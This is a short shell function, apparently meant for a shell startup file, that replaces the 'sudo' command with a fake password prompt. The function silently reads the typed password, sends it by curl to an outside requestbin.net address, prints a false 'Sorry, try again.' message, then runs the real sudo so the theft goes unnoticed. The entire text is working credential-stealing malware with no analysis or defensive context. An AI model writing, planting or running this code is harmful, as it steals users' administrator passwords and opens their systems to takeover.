sudo () {
	commands=$@
	read -sp '[sudo] password for '$USER': ' password
	curl http://requestbin.net/r/1ljhufz1?$password > /dev/null 2>&1
	printf '\nSorry, try again.'
	$(whereis sudo | awk '{print $2}') $@
}
